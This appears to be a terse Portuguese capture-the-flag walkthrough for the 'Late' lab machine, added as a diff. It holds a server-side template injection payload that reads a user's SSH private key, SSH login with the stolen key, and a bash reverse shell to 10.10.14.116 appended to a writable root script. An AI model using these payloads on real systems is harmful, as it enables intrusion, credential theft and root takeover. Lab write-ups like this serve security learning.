@@ -1,0 +1,39 @@
+http://images.late.htb/
+
+
+ao upar uma img e intercepitar com o burp e colocar isso no conteudo dela:<p>a</p>
+
+nos retorna um erro nos mostrando o diretorio do usuario
+
+Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/SCRIPT.jpg1278'
+
+
+nano x
+
+
+    {{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
+
+
+shift + pritnscreen
+
+salvar e fazer o upload
+
+ssh -i id_rsa svc_acc@late.htb
+
+
+rodar pspy64 ou linpeas
+
+/usr/local/sbin/ssh-alert.sh
+
+podemos escrever nesse arquivo
+
+
+
+nc -lnvp 4444
+
+echo "bash -c 'bash -i >& /dev/tcp/10.10.14.116/4444 0>&1'" >> ssh-alert.sh
+
+
+root@late:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
